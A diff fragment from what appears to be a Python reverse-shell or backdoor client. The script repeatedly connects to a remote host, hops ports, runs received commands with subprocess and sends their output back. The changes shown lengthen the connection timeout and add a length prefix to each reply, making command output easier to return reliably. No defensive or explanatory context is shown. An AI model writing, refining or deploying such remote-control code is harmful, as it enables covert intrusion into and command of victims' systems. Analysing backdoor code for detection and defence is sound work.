@@ -32,7 +32,7 @@ while True:
 	try:
 		if not open_conn:
 			s = socket.socket()
-			s.settimeout(10)
+			s.settimeout(60)
 			print("Trying to connect")
 			s.connect((HOST, PORT))
 			PORT = nextPort(PORT)
@@ -56,6 +56,7 @@ while True:
 					rsp = "No such directory"
 			else:
 				rsp = subprocess.getoutput(cmd)
+			s.send(str(len(rsp.encode())).encode())
 			s.send(rsp.encode())
 	except Exception as e:
 		open_conn = False
